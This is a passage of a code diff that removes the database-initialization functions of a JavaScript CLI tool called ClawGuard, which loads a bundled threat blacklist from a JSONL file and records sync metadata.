- */
-async function cmdInit(args) {
-    const { values } = parseArgs({
-        args,
-        options: {
-            force: { type: 'boolean', short: 'f' }
-        }
-    });
-
-    console.log(c('cyan', '🔧 Initializing ClawGuard database...'));
-    await initializeDatabase(values.force);
-    console.log(c('green', '✅ Database initialized!'));
-}
-
-/**
- * Ensure database is initialized with data
- */
-async function ensureInitialized() {
-    const db = getDatabase();
-    const stats = db.getStats();
-    
-    if (stats.total_threats === 0) {
-        console.log(c('yellow', '⚠️  Database empty, initializing...'));
-        await initializeDatabase(false);
-    }
-}
-
-/**
- * Initialize database with bundled blacklist
- */
-async function initializeDatabase(force = false) {
-    const db = getDatabase();
-    
-    if (!force) {
-        const stats = db.getStats();
-        if (stats.total_threats > 0) {
-            return; // Already initialized
-        }
-    }
-
-    // Load bundled blacklist
-    const blacklistPath = join(__dirname, '..', 'db', 'blacklist.jsonl');
-    
-    if (!existsSync(blacklistPath)) {
-        console.error(c('red', 'Error: Bundled blacklist not found'));
-        console.log(c('dim', `Expected at: ${blacklistPath}`));
-        process.exit(3);
-    }
-
-    const count = db.importJSONL(blacklistPath);
-    db.setSyncMeta('last_sync', new Date().toISOString());
-    db.setSyncMeta('db_version', VERSION);
-    
-    console.log(c('dim', `   Loaded ${count} threats from bundled database`));
-}
-
-// Run main
 main();
